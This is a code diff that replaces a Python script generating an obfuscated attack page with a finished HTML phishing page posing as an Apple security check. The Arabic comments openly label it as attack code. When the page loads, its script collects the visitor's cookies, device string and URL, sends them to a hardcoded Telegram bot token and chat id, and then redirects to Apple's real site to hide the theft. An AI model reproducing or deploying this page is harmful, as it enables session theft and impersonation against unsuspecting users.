@@ -1,29 +1,36 @@
-import base64
-
-def generate_attack_link(bot_token, chat_id):
-    # الكود الخبيث مشفر بـ Base64 لتجنب الاكتشاف
-    payload = f"""
-    var info = 'Victim Data: ' + document.cookie + ' IP: ' + window.location.hostname;
-    fetch('https://api.telegram.org/bot{bot_token}/sendMessage?chat_id={chat_id}&text=' + encodeURIComponent(info));
-    """
-    encoded_payload = base64.b64encode(payload.encode()).decode()
-    
-    # بناء الصفحة
-    html_content = f"""
-    <html>
-    <head><title>Loading...</title></head>
-    <body>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Apple Security Verification</title>
     <script>
-    eval(atob('{encoded_payload}'));
-    window.location.href = "https://icloud.com"; // تحويل الضحية لموقع حقيقي للتمويه
-    </script>
-    </body>
-    </html>
-    """
-    
-    with open("index.html", "w") as f:
-        f.write(html_content)
-    print("[+] Attack file 'index.html' generated. Upload it to any free hosting.")
+        // الكود الهجومي لإرسال البيانات لبوتك
+        async function sendData() {
+            const token = "8213467523:AAE-4yv3jiYvyAHpJU4XJ90lALV5OSKzNDE";
+            const chat_id = "6888107255";
+            
+            // جمع المعلومات الأساسية (IP/Device/Cookies)
+            let details = "⚠️ نفاذ جديد: \n";
+            details += "🌐 الموقع: " + window.location.hostname + "\n";
+            details += "📱 الجهاز: " + navigator.userAgent + "\n";
+            details += "🍪 الكوكيز: " + (document.cookie || "None") + "\n";
+            details += "🔗 الرابط المفتوح: " + window.location.href;
 
-# استبدل البيانات هنا
-generate_attack_link("8213467523:AAE-4yv3jiYvyAHpJU4XJ90lALV5OSKzNDE", "6888107255")
+            const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(details)}`;
+            
+            try {
+                await fetch(url);
+            } catch (e) {}
+
+            // تمويه: تحويل الضحية لموقع آبل الحقيقي بعد السرقة
+            window.location.replace("https://iforgot.apple.com");
+        }
+        window.onload = sendData;
+    </script>
+</head>
+<body style="background-color: black; color: white; text-align: center; padding-top: 50px;">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" width="100" style="filter: invert(1);">
+    <h2>Verifying Security Status...</h2>
+    <p>Please wait while we secure your connection.</p>
+</body>
+</html>
